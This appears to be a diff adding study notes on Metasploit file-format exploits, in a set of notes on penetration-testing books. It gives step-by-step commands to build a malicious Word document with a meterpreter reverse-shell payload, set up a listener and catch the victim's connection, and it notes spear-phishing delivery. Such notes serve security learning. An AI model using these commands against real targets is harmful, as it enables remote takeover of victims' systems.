@@ -80,7 +80,60 @@
 
 
 ## Metasploit: File-Format Exploits
--
+
+**File-format exploits:**
+- Vulnerabilities in file readers/programs that open files (e.g., Word, PDF readers).
+- Rely on user interaction: Malicious files are made to run code when a user opens them. The file can be of any format.
+- Commonly used in spear-phishing attacks
+- Typically very effective but the success of the attack depends on how much information can be gained about the target (reconnaissance) before implementing the attack.
+
+**Using Metasploit for File-Format Exploits:**
+1. Search for file-format exploits
+    - `msf > search fileformat date:<year>`
+    - Filters available file-format exploits by year
+      
+2. Select a module:
+    - `msf > use exploit/windows/fileformat/word_mshtml_rce`
+    - Loads the Word MSHTML exploit module
+      
+3. View and configure options
+    - `msf exploit > options`
+    - Examples of module & payload options:
+        - `FILENAME`: Output file name (e.g., msf.docx)
+        - `OBFUSCATE`: Obfuscates malicious JavaScript content 
+        - `LHOST`: The listen address (Attacker’s IP for reverse connection)
+        - `LPORT`: Listening port (e.g., 443)
+          
+4. Set the payload (reverse shell)
+    - `msf  exploit > set payload windows/x64/meterpreter/reverse_tcp`
+    - `msf exploit > set LHOST 10.0.1.45`
+    - `msf exploit > set LPORT 443`
+    - `msf exploit > exploit`
+    - Creates a malicious file (e.g. msf.doc) that connects back to the attacker when opened.
+    - The exported malicious file/document can be delivered to targets e.g. via email.  
+
+**Sending payloads/ Handling the payload connection:**
+- The attacker’s system should be set up to catch the connection coming from the victim’s system (set up before the target opens the malicious file)
+
+1. Set up a multi-handler listener:
+    - A tool on the attacker’s system that waits for incoming connections from exploited systems. It "catches" the reverse shell connection, allowing remote control of the victim’s system
+
+    - `msf exploit > use exploit/multi/handler`
+    - `msf exploit(handler) > set payload windows/meterpreter/reverse_tcp`
+    - `msf exploit (handler) > set LHOST 10.0.1.45`
+    - `msf exploit (handler) > set LPORT 443`
+    - `msf exploit (handler) > exploit -j`
+    - The `-j` flag runs the handler as a background job.
+
+
+2. Wait for victim to open the document:
+    - Once the malicious file is opened on a vulnerable system, a shell is presented to the attacker:
+      
+    - `[*] Sending stage (749056 bytes) to 10.0.1.12`
+    - `[*] Meterpreter session 1 opened (10.0.1.45:443 -> 10.0.1.12:2718) msf exploit (handler) > sessions -i 1`
+    -` [*] Starting interaction with 1.. >`
+    - This gives the attacker remote control over the system.
+
 
 ## The Ultimate Kali Linux Book: Understanding Active Directory
 -
